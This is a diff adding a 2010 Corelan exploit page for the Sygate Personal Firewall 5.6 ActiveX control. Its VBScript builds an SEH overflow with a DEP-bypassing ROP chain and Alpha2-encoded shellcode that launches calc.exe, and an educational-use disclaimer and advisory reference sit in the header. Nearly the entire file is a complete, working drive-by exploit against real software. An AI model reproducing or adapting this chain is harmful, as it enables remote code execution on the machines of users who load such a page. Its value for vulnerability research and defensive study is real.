@@ -1,0 +1,132 @@
+<html>
+<!--
+        |------------------------------------------------------------------|
+        |                         __               __                      |
+        |   _________  ________  / /___ _____     / /____  ____ _____ ___  |
+        |  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
+        | / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
+        | \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
+        |                                                                  |
+        |                                       http://www.corelan.be:8800 |
+        |                                              security@corelan.be |
+        |                                                                  |
+        |-------------------------------------------------[ EIP Hunters ]--|
+  
+# Software      : Sygate Personal Firewall 5.6 build 2808 ActiveX w/ DEP bypass
+# Author        : Lincoln
+# Date      	: June 11, 2010
+# Reference     : http://www.corelan.be:8800/advisories.php?id=CORELAN-10-050
+# OS            : Windows
+# Tested on     : XP SP3 En (VirtualBox)
+# Type of vuln  : SEH
+# Greetz to     : Corelan Security Team
+# http://www.corelan.be:8800/index.php/security/corelan-team-members/
+#
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+#
+# Note : you are not allowed to edit/modify this code.
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+#
+#
+# Bad Chars: 80-9f (makes for extra fun)
+# Tested on IE 7/6 , nop slide used
+#
+#
+-->
+
+<object classid='clsid:D59EBAD7-AF87-4A5C-8459-D3F6B918E7C9' id='target' ></object>
+<script language='vbscript'>
+
+seh   = unescape("%13%16%47%06") 	'#ADD ESP,46C # RETN
+
+
+rop = rop + String(72, "D") 		'#Junk
+rop = rop + unescape("%19%16%47%06")	'#Nop
+rop = rop + unescape("%19%16%47%06")	'#Nop
+rop = rop + unescape("%19%16%47%06")	'#Nop
+rop = rop + unescape("%19%16%47%06")	'#Nop
+rop = rop + unescape("%19%16%47%06")	'#Nop
+rop = rop + unescape("%19%16%47%06")	'#Nop
+rop = rop + unescape("%19%16%47%06")	'#Nop
+
+'#edx
+rop = rop + unescape("%33%b6%44%06")	'#POP EBP # RETN
+rop = rop + unescape("%01%c0%4b%06")	
+rop = rop + unescape("%65%b9%47%06")	'#MOV EDX,EBP # POP REGISTERS CHAIN #RETN
+
+'#alignment					
+rop = rop + unescape("%7c%bd%47%06")	'#POP data into registers	
+rop = rop + unescape("%49%50%45%06")	
+rop = rop + unescape("%41%41%41%41")	
+rop = rop + unescape("%ff%ff%ff%ff")	
+rop = rop + unescape("%50%50%50%50")	
+
+'#ebx 
+rop = rop + unescape("%b2%7d%48%06")    '#ADD EAX,80 # POP EBP # RETN
+rop = rop + unescape("%41%41%41%41")	'#Junk
+rop = rop + unescape("%b2%7d%48%06")    '#ADD EAX,80 # POP EBP # RETN
+rop = rop + unescape("%41%41%41%41")	'#Junk
+rop = rop + unescape("%b2%7d%48%06")    '#ADD EAX,80 # POP EBP # RETN
+rop = rop + unescape("%41%41%41%41")	'#Junk
+rop = rop + unescape("%d9%c4%47%06")	'#ADD EBX,EAX # PUSH 1 # POP EAX # RETN 
+
+'#ebp
+rop = rop + unescape("%dd%c4%47%06")	'#POP EAX # RETN
+rop = rop + unescape("%1f%73%d0%cc")    
+rop = rop + unescape("%ae%f5%47%06")    '#SUB EAX,ECX # RETN
+rop = rop + unescape("%30%14%45%06")	'#MOV EBP,EAX # CALL ESI
+
+'#esi
+rop = rop + unescape("%22%cd%46%06")	'#POP ESI # RETN
+rop = rop + unescape("%ff%ff%ff%ff")	
+
+'#eax
+rop = rop + unescape("%dd%c4%47%06")	'#POP EAX # RETN
+rop = rop + unescape("%63%72%d0%cc")    
+rop = rop + unescape("%ae%f5%47%06")    '#SUB EAX,ECX # RETN 
+
+'#game over
+rop = rop + unescape("%47%71%49%06")	'#PUSHAD (throw it all on the stack baby!)
+
+
+'[*] Using Msf::Encoder::Alpha2 with final size of 338 bytes cmd=calc.exe
+sc = unescape("%eb%03%59%eb%05%e8%f8%ff%ff%ff%49%49%49%49%49%49") & _
+unescape("%49%49%49%49%49%49%49%49%49%48%49%49%51%5a%6a%45") & _
+unescape("%58%30%41%31%50%41%42%6b%42%41%55%32%42%42%32%41") & _
+unescape("%41%30%41%41%58%42%38%42%42%50%75%6d%39%39%6c%6d") & _
+unescape("%38%57%34%77%70%67%70%33%30%4c%4b%63%75%75%6c%6c") & _
+unescape("%4b%41%6c%75%55%64%38%55%51%4a%4f%4c%4b%42%6f%46") & _
+unescape("%78%4e%6b%61%4f%77%50%65%51%78%6b%63%79%4c%4b%47") & _
+unescape("%44%6e%6b%47%71%48%6e%65%61%59%50%6e%79%6c%6c%4f") & _
+unescape("%74%4f%30%50%74%47%77%6a%61%5a%6a%54%4d%64%41%5a") & _
+unescape("%62%68%6b%4a%54%55%6b%42%74%74%64%47%74%70%75%6b") & _
+unescape("%55%6c%4b%61%4f%76%44%66%61%5a%4b%71%76%6c%4b%54") & _
+unescape("%4c%72%6b%4c%4b%53%6f%77%6c%56%61%7a%4b%4e%6b%65") & _
+unescape("%4c%6c%4b%77%71%38%6b%6b%39%43%6c%71%34%74%44%59") & _
+unescape("%53%67%41%6f%30%63%54%6e%6b%63%70%70%30%4e%65%4b") & _
+unescape("%70%61%68%36%6c%6c%4b%63%70%46%6c%4c%4b%54%30%77") & _
+unescape("%6c%4c%6d%6e%6b%55%38%57%78%38%6b%36%69%6e%6b%6f") & _
+unescape("%70%4e%50%73%30%75%50%55%50%6e%6b%33%58%77%4c%43") & _
+unescape("%6f%50%31%59%66%65%30%33%66%6e%69%69%68%4f%73%4b") & _
+unescape("%70%53%4b%42%70%30%68%4a%50%6e%6a%65%54%51%4f%52") & _
+unescape("%48%6f%68%4b%4e%6c%4a%66%6e%33%67%4b%4f%6d%37%51") & _
+unescape("%73%50%61%62%4c%70%63%56%4e%73%55%73%48%41%75%47") & _
+unescape("%70%45")
+
+
+junk  = String(2814, "D") '3128
+mjunk = String(25000, "A")
+
+arg1=1
+arg2=1
+arg3= rop + sc + junk + seh + mjunk
+arg4="defaultV"
+arg5="defaultV"
+
+target.SetRegString arg1 ,arg2 ,arg3 ,arg4 ,arg5 
+
+</script>
+<b><center>Sygate Personal Firewall 5.6 build 2808 ActiveX exploit w/ DEP bypass</b></center>
+</html>
